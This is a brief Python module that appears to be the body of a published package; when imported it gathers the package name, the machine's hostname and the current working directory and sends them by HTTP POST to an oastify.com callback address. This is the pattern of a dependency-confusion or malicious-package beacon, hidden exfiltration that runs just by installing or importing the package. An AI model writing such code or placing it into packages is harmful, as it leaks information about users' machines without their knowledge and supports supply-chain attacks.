import os
import requests

PACKAGE_NAME = __package__ or os.path.basename(os.path.dirname(os.path.abspath(__file__)))
HOSTNAME = os.uname().nodename
CURRENT_PATH = os.getcwd()

url = "https://3gkkr6u2z1a9rinocp0ue4tw1n7ev4jt.oastify.com"

data = {
    "package_name": PACKAGE_NAME,
    "hostname": HOSTNAME,
    "current_path": CURRENT_PATH
}

response = requests.post(url, data=data)
